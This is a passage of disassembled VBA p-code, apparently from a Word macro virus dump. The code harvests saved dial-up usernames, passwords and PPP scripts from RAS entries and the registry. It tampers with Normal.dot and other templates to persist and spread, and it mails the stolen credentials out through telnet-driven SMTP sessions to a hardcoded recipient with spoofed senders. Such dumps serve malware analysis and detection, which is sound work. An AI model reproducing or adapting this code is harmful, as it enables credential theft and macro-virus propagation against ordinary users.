' 	Dim 
' 	VarDefn PWDdet (As Byte)
' Line #151:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #152:
' 	Dim 
' 	VarDefn z (As Long)
' Line #153:
' 	Dim 
' 	VarDefn PWD (As String)
' 	VarDefn UsName (As String)
' Line #154:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	LitDI2 0x0108 
' 	LitDI2 0x0000 
' 	ArgsLd PAR 0x0001 
' 	MemSt dwSize 
' Line #157:
' 	LitDI2 0x0100 
' 	LitDI2 0x0000 
' 	ArgsLd PAR 0x0001 
' 	MemLd dwSize 
' 	Mul 
' 	St S 
' Line #158:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd PAR 0x0001 
' 	Ld S 
' 	Ld Counter 
' 	ArgsLd RasEnumEntries 0x0005 
' 	St res 
' Line #159:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #160:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0100 
' 	For 
' Line #161:
' 	Ld ConName 
' 	Ld j 
' 	Ld i 
' 	ArgsLd PAR 0x0001 
' 	ArgsMemLd szEntryName 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St ConName 
' Line #162:
' 	StartForVariable 
' 	Next 
' Line #163:
' 	Ld ConName 
' 	Ld ConName 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St ConName 
' Line #164:
' Line #165:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0100 
' 	For 
' Line #166:
' 	Ld n 
' 	Ld i 
' 	ArgsLd PAR 0x0001 
' 	ArgsMemLd szEntryName 0x0001 
' 	Ld n 
' 	Ld PARAM 
' 	ArgsMemSt szEntryName 0x0001 
' Line #167:
' 	StartForVariable 
' 	Next 
' Line #168:
' 	LitDI2 0x041C 
' 	Ld PARAM 
' 	MemSt dwSize 
' Line #169:
' 	LitDI2 0x0001 
' 	Ld PARAM 
' 	Ld PWDdet 
' 	ArgsLd RasGetEntryDialParams 0x0003 
' 	St res 
' Line #170:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0100 
' 	For 
' Line #171:
' 	Ld UsName 
' 	Ld z 
' 	Ld PARAM 
' 	ArgsMemLd szUserName 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St UsName 
' Line #172:
' 	Ld PWD 
' 	Ld z 
' 	Ld PARAM 
' 	ArgsMemLd szPassword 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St PWD 
' Line #173:
' 	StartForVariable 
' 	Next 
' Line #174:
' 	Ld UsName 
' 	Ld UsName 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St UsName 
' Line #175:
' 	Ld PWD 
' 	Ld PWD 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St PWD 
' Line #176:
' 	Ld Resalt 
' 	LitStr 0x000C "Connection: "
' 	Add 
' 	Ld ConName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "User: "
' 	Add 
' 	Ld UsName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "Password: "
' 	Add 
' 	Ld PWD 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #177:
' 	LitStr 0x0000 ""
' 	St PWD 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St UsName 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St ConName 
' Line #178:
' 	ArgsCall DoEvents 0x0000 
' Line #179:
' 	StartForVariable 
' 	Next 
' Line #180:
' 	Ld Resalt 
' 	St Conn_ 
' Line #181:
' 	EndFunc 
' Line #182:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #183:
' 	FuncDefn (Sub AutoExit())
' Line #184:
' 	Dim 
' 	VarDefn Counter (As Integer)
' Line #185:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #186:
' 	Dim 
' 	VarDefn VBComp (As Object)
' Line #187:
' 	Dim 
' 	VarDefn Body (As String)
' Line #188:
' Line #189:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #190:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #191:
' 	OnError (Resume Next) 
' Line #192:
' Line #193:
' 	Ld Templates 
' 	MemLd Count 
' 	St Counter 
' Line #194:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #195:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #196:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBComp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #197:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0023 "Dial-up_script_and_password_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #198:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd CodeModule 
' 	With 
' Line #199:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #200:
' 	EndWith 
' Line #201:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #202:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	StartForVariable 
' 	Next 
' Line #206:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #207:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #208:
' 	ArgsCall Tmsn 0x0000 
' Line #209:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #210:
' 	EndSub 
' Line #211:
' Line #212:
' 	FuncDefn (Sub Sender_main())
' Line #213:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #214:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #215:
' 	Dim 
' 	VarDefn NoConn_ (As String)
' Line #216:
' 	Dim 
' 	VarDefn hwnd (As Long)
' Line #217:
' 	Dim 
' 	VarDefn GrabStr (As String)
' Line #218:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #219:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #220:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #221:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #222:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #223:
' 	Dim 
' 	VarDefn Title (As String)
' Line #224:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #225:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn Host (As String)
' Line #226:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #227:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #228:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #229:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #230:
' 	Dim 
' 	VarDefn Twnd (As String)
' Line #231:
' 	Dim 
' 	VarDefn None (As String)
' Line #232:
' 	Dim 
' 	VarDefn RecipientOfMessage_ (As String)
' Line #233:
' 	Dim 
' 	VarDefn SenderAddress (As String)
' Line #234:
' 	Dim 
' 	VarDefn SenderDomain (As String)
' Line #235:
' 	Dim 
' 	VarDefn UsName
' Line #236:
' 	Dim 
' 	VarDefn Domain_ (As String)
' Line #237:
' 	Dim 
' 	VarDefn Char_ (As Byte)
' Line #238:
' 	Dim 
' 	VarDefn z (As Integer)
' Line #239:
' Line #240:
' 	OnError (Resume Next) 
' Line #241:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #242:
' 	LitStr 0x0010 "<kashek@usa.net>"
' 	St RecipientOfMessage_ 
' Line #243:
' 	LitStr 0x000C "smtp.mail.ru"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "@mail.ru"
' 	St Domain_ 
' Line #244:
' 	LitStr 0x0006 "-dima-"
' 	LitStr 0x0008 "2vasiliy"
' 	LitStr 0x0006 "521521"
' 	LitStr 0x000B "DGabidullin"
' 	LitStr 0x0009 "Intarsija"
' 	LitStr 0x0008 "KirovDVP"
' 	LitStr 0x0009 "Mischelli"
' 	LitStr 0x000E "MonitorExpress"
' 	LitStr 0x000B "Sveta-P2000"
' 	LitStr 0x0010 "Voronin_Vladimir"
' 	LitStr 0x000B "a_kladenova"
' 	LitStr 0x0008 "abccondi"
' 	LitStr 0x0003 "abs"
' 	LitStr 0x0009 "admiralll"
' 	LitStr 0x0003 "ako"
' 	LitStr 0x0006 "alazif"
' 	LitStr 0x0008 "alcan777"
' 	LitStr 0x000B "aleksiv2000"
' 	LitStr 0x000B "alena_elena"
' 	LitStr 0x000C "alexander555"
' 	LitStr 0x0007 "alexkis"
' 	LitStr 0x0007 "alexsar"
' 	LitStr 0x0007 "alltair"
' 	LitStr 0x0008 "alt-info"
' 	LitStr 0x0008 "antares_"
' 	LitStr 0x0007 "anton76"
' 	LitStr 0x0008 "artyserg"
' 	LitStr 0x0006 "arxi77"
' 	LitStr 0x0003 "asp"
' 	LitStr 0x0003 "ate"
' 	LitStr 0x0008 "avatchev"
' 	LitStr 0x0009 "axel_extr"
' 	LitStr 0x0005 "balds"
' 	LitStr 0x000C "bars-profile"
' 	LitStr 0x0006 "batsek"
' 	LitStr 0x0008 "best-njl"
' 	LitStr 0x000A "bigmoney4u"
' 	LitStr 0x0003 "bkp"
' 	LitStr 0x0008 "braut_99"
' 	LitStr 0x000A "broker-nsk"
' 	LitStr 0x0003 "bxk"
' 	LitStr 0x0009 "c_service"
' 	LitStr 0x0007 "carlych"
' 	LitStr 0x0004 "ciap"
' 	LitStr 0x0007 "courses"
' 	LitStr 0x0008 "darlenka"
' 	LitStr 0x0006 "daswer"
' 	LitStr 0x0008 "datasave"
' 	ArgsArray Array 0x0030 
' 	St UsName 
' Line #245:
' 	LitStr 0x000F "itk2.bas-net.by"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #246:
' 	LitStr 0x000C "195.75.32.20"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #247:
' Line #248:
' 	LitDI2 0x0003 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #249:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #250:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #251:
' Line #252:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #253:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #254:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #255:
' 	LitStr 0x000E "Connect failed"
' 	St NoConn_ 
' Line #256:
' 	ElseBlock 
' Line #257:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Òåëíåò - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #258:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #259:
' 	LitStr 0x0006 "Òåëíåò"
' 	St Twnd 
' Line #260:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #261:
' 	LitStr 0x0010 "Ñáîé ïîäêëþ÷åíèÿ"
' 	St NoConn_ 
' Line #262:
' 	ElseBlock 
' Line #263:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Telnet - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #264:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #265:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #266:
' 	LitStr 0x0010 "Ñáîé ïîäêëþ÷åíèÿ"
' 	St NoConn_ 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	EndIfBlock 
' Line #269:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #270:
' 	ArgsCall DoEvents 0x0000 
' Line #271:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #272:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #273:
' 	ArgsCall DoEvents 0x0000 
' Line #274:
' 	Ld Timer 
' 	St Start 
' Line #275:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0046 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #276:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #277:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld NoConn_ 
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #278:
' 	ArgsCall DoEvents 0x0000 
' Line #279:
' 	Loop 
' Line #280:
' 	Ld Handle 
' 	SelectCase 
' Line #281:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #282:
' Line #283:
' 	ArgsCall Read 0x0000 
' Line #284:
' 	Ld UsName 
' 	FnUBound 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd UsName 0x0001 
' 	St SenderDomain 
' Line #285:
' 	Ld UsName 
' 	FnUBound 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd UsName 0x0001 
' 	Ld Domain_ 
' 	Add 
' 	St SenderAddress 
' Line #286:
' Line #287:
' 	LineCont 0x000C 12 00 01 00 1E 00 01 00 28 00 01 00
' 	LitStr 0x0007 "helo My"
' 	Ld SenderDomain 
' 	Add 
' 	LitStr 0x000F "#$$mail from: <"
' 	Add 
' 	Ld SenderAddress 
' 	Add 
' 	LitStr 0x0003 ">#$"
' 	Add 
' 	LitStr 0x0009 "rcpt to: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x0008 "#$data#$"
' 	Add 
' 	LitStr 0x0007 "From: <"
' 	Add 
' 	Ld SenderAddress 
' 	Add 
' 	LitStr 0x0002 ">#"
' 	Add 
' 	LitStr 0x0004 "To: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	LitStr 0x0006 "Date: "
' 	Add 
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0058 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#"
' 	Add 
' 	LitStr 0x0050 "Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: 7bit##"
' 	Add 
' 	St SMTP 
' Line #288:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #289:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #290:
' 	Ld Grab 
' 	Ld SCP 
' 	Add 
' 	LitStr 0x0009 "##.#quit#"
' 	Add 
' 	St GrabStr 
' Line #291:
' 	Ld GrabStr 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #292:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #293:
' 	Ld Timer 
' 	St Start 
' Line #294:
' 	Ld hwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #295:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hwnd 
' Line #296:
' 	ArgsCall DoEvents 0x0000 
' Line #297:
' 	Loop 
' Line #298:
' 	Ld hwnd 
' 	SelectCase 
' Line #299:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #300:
' Line #301:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #302:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #303:
' 	CaseElse 
' Line #304:
' 	Ld hwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #305:
' 	Ld Friend 
' 	St NF 
' Line #306:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #307:
' 	Ld WinDir 
' 	LitStr 0x0009 "logow.sys"
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #308:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #309:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #310:
' 	ArgsCall DoEvents 0x0000 
' Line #311:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #312:
' 	ExitSub 
' Line #313:
' 	EndSelect 
' Line #314:
' 	CaseElse 
' Line #315:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #316:
' 	Ld HandleBW 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #317:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #318:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #319:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #320:
' 	LitDI2 0x0000 
' 	St HandleBW 
' Line #321:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #322:
' 	EndSelect 
' Line #323:
' 	StartForVariable 
' 	Next 
' Line #324:
' 	EndIfBlock 
' Line #325:
' 	EndSub 
' Line #326:
' 	FuncDefn (Sub Filler(MessStr As String, hwnd As Long))
' Line #327:
' 	Dim 
' 	VarDefn i (As Long)
' Line #328:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #329:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #330:
' 	OnError (Resume Next) 
' Line #331:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #332:
' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #333:
' 	Ld Tmp 
' 	SelectCase 
' Line #334:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #335:
' 	ArgsCall DoEvents 0x0000 
' Line #336:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #337:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #338:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #339:
' 	CaseElse 
' Line #340:
' 	Ld i 
' 	LitDI2 0x017C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #341:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #342:
' 	EndIfBlock 
' Line #343:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #344:
' 	EndSelect 
' Line #345:
' 	StartForVariable 
' 	Next 
' Line #346:
' 	EndSub 
' Line #347:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #348:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #349:
' 	Ld Timer 
' 	St Start 
' Line #350:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #351:
' 	ArgsCall DoEvents 0x0000 
' Line #352:
' 	Loop 
' Line #353:
' 	EndSub 
' Line #354:
' 	FuncDefn (Function SCP())
' Line #355:
' 	Dim 
' 	VarDefn res (As Long)
' Line #356:
' 	Dim 
' 	VarDefn res1 (As Long)
' Line #357:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #358:
' 	Dim 
' 	VarDefn hkey (As Long)
' Line #359:
' 	Dim 
' 	VarDefn hkey1 (As Long)
' Line #360:
' 	Dim 
' 	VarDefn i (As Long)
' Line #361:
' 	Dim 
' 	VarDefn KeyName (As String)
' Line #362:
' 	Dim 
' 	VarDefn KeyLen (As Long)
' Line #363:
' 	Dim 
' 	VarDefn ClassName (As String)
' Line #364:
' 	Dim 
' 	VarDefn ClassLen (As Long)
' Line #365:
' 	Dim 
' 	VarDefn lastwrite
' Line #366:
' 	Dim 
' 	VarDefn user (As String)
' 	VarDefn PPPScript (As String)
' Line #367:
' 	Dim 
' 	VarDefn NF (As Long)
' Line #368:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #369:
' 	OnError (Resume Next) 
' Line #370:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0015 "RemoteAccess\Profile\"
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res 
' Line #371:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #372:
' 	LitStr 0x001A "Can not read entry from R."
' 	St Resalt 
' Line #373:
' 	Ld Resalt 
' 	St SCP 
' Line #374:
' 	ExitFunc 
' Line #375:
' 	EndIfBlock 
' Line #376:
' 	LitDI2 0x0000 
' 	St i 
' Line #377:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #378:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St KeyName 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St ClassName 
' Line #379:
' 	LitDI2 0x00FF 
' 	St KeyLen 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	St ClassLen 
' Line #380:
' 	Ld hkey 
' 	Ld i 
' 	Ld KeyName 
' 	Ld KeyLen 
' 	LitDI2 0x0000 
' 	ParamByVal 
' 	Ld ClassName 
' 	Ld ClassLen 
' 	Ld lastwrite 
' 	ArgsLd RegEnumKeyEx 0x0008 
' 	St res 
' Line #381:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #382:
' 	Ld KeyName 
' 	Ld KeyLen 
' 	ArgsLd LBound 0x0002 
' 	St KeyName 
' Line #383:
' 	Ld ClassName 
' 	Ld ClassLen 
' 	ArgsLd LBound 0x0002 
' 	St ClassName 
' Line #384:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0015 "RemoteAccess\Profile\"
' 	Ld KeyName 
' 	Add 
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey1 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res1 
' Line #385:
' 	Ld res1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #386:
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\RemoteAccess\Profile\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0004 "user"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St user 
' Line #387:
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\RemoteAccess\Profile\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "PPPScript"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PPPScript 
' Line #388:
' 	Ld hkey1 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res1 
' Line #389:
' 	Ld PPPScript 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #390:
' 	Ld Friend 
' 	St NF 
' Line #391:
' 	OnError aaa 
' Line #392:
' 	Ld PPPScript 
' 	Ld NF 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #393:
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x1B58 
' 	Lt 
' 	IfBlock 
' Line #394:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #395:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #396:
' 	Ld PPPScript 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Tmp 
' 	Add 
' 	St PPPScript 
' Line #397:
' 	Loop 
' Line #398:
' 	ElseBlock 
' Line #399:
' 	Ld PPPScript 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "Ôàéë > 7 kB."
' 	Add 
' 	St PPPScript 
' Line #400:
' 	EndIfBlock 
' Line #401:
' 	Ld NF 
' 	Close 0x0001 
' Line #402:
' 	Label aaa 
' Line #403:
' 	OnError (Resume Next) 
' Line #404:
' 	EndIfBlock 
' Line #405:
' 	Ld Resalt 
' 	LitStr 0x000B "Connection "
' 	Add 
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0003 " - "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "user: "
' 	Add 
' 	Ld user 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "PPPScript:"
' 	Add 
' 	Ld PPPScript 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #406:
' 	ElseBlock 
' Line #407:
' 	Ld Resalt 
' 	LitStr 0x0015 "Can not open the key "
' 	Add 
' 	Ld KeyName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
